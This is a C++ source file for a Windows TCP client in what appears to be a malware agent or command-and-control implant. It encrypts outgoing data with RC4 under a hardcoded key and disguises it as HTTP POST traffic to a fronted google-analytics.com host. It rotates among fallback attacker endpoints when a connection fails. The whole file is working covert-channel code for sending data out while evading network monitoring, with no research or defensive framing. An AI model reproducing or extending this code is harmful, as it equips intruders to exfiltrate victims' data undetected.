#include "agent/network/tcp_client.hpp"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#include "agent/utils/rc4.hpp"

#pragma comment(lib, "ws2_32.lib")

TcpClient::TcpClient(const std::string& defaultIp, int defaultPort) {
    sock = INVALID_SOCKET;
    isConnected = false;
    encryption = nullptr;
    frontDomain = "www.google-analytics.com"; // DEFAULT FRONT
    currentEndpointIndex = 0;
    
    // Initial Endpoint
    endpoints.push_back({defaultIp, defaultPort});
    
    // Key: DEADBEEF...
    key = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE};

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
}

TcpClient::~TcpClient() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
    }
    if(encryption) delete encryption;
    WSACleanup();
}

void TcpClient::AddEndpoint(const std::string& ip, int port) {
     endpoints.push_back({ip, port});
}

void TcpClient::SetFrontDomain(const std::string& domain) {
    frontDomain = domain;
}

void TcpClient::SetTarget(const std::string& newIp, int newPort) {
    endpoints.clear();
    endpoints.push_back({newIp, newPort});
    currentEndpointIndex = 0;
    isConnected = false;
}

bool TcpClient::Connect() {
    if(sock != INVALID_SOCKET) {
        closesocket(sock);
        sock = INVALID_SOCKET;
    }
    
    if(endpoints.empty()) return false;

    // Reset Encryption 
    if(encryption) delete encryption;
    encryption = new RC4(key);

    // Try multiple endpoints
    for(size_t i = 0; i < endpoints.size(); i++) {
        size_t idx = (currentEndpointIndex + i) % endpoints.size();
        auto& target = endpoints[idx];

        struct addrinfo hints, *res;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        if(getaddrinfo(target.ip.c_str(), std::to_string(target.port).c_str(), &hints, &res) != 0) continue;

        sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        if (sock == INVALID_SOCKET) {
            freeaddrinfo(res);
            continue;
        }

        if (connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
            closesocket(sock);
            sock = INVALID_SOCKET;
            freeaddrinfo(res);
            continue;
        }

        freeaddrinfo(res);
        currentEndpointIndex = idx; // Remember working endpoint
        isConnected = true;
        return true;
    }

    return false;
}

bool TcpClient::SendData(const std::string& data) {
    std::lock_guard<std::mutex> lock(netMtx);
    
    if (!isConnected) {
        if (!Connect()) return false;
    }

    // 2. Encrypt
    std::string packet = data + "\n";
    std::string cipher = encryption->Encrypt(packet);
    
    // 3. Masquerade as HTTP via Domain Fronting
    std::string http = "POST /api/v1/collect HTTP/1.1\r\n";
    http += "Host: " + frontDomain + "\r\n"; // THE FRONT
    http += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n";
    http += "Content-Type: application/x-www-form-urlencoded\r\n";
    http += "Content-Length: " + std::to_string(cipher.size()) + "\r\n";
    http += "Connection: close\r\n";
    http += "\r\n";
    http += cipher;
    
    int sent = send(sock, http.c_str(), http.length(), 0);

    if (sent == SOCKET_ERROR) {
        isConnected = false;
        // Rotate to next endpoint
        currentEndpointIndex = (currentEndpointIndex + 1) % endpoints.size();
        
        if(Connect()) {
            // Retry
            send(sock, http.c_str(), http.length(), 0);
            return true;
        }
        return false;
    }

    return true;
}
